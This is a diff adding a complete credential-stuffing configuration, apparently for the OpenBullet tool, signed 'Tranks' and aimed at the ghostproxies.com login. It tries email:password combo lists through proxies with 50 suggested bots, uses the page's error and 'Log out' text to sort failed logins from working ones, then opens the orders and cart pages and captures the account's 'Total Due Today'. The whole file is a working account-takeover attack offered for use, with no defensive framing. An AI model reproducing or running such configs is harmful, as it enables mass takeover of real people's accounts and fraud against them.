@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "Ghost.By:Tranks",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-11T17:05:30.8379121+02:00",
+  "AdditionalInfo": "",
+  "KeysDB": "",
+  "LocalKeysDB": "",
+  "isWtoEdit": true,
+  "Author": "Tranks",
+  "Version": "1.2.1.6",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Try REQUEST POST "https://ghostproxies.com/login" AutoRedirect=FALSE 
+  CONTENT "_method=POST&data%5BUser%5D%5Bemail%5D=<USER>&data%5BUser%5D%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://ghostproxies.com" 
+  HEADER "Referer: https://ghostproxies.com/login" 
+
+#CHECK KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password." 
+
+#Agin REQUEST GET "https://ghostproxies.com/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#_CHECK KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Log out" 
+
+#AGIN REQUEST GET "https://ghostproxies.com/orders/cart" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Tranks PARSE "<SOURCE>" LR "<div class=\"total-price-container\">$<div class=\"total-price price\">" "</div></div><div class=\"savings\"></div>" -> CAP "Total Due Today" "" " |By:Tranks" 
+
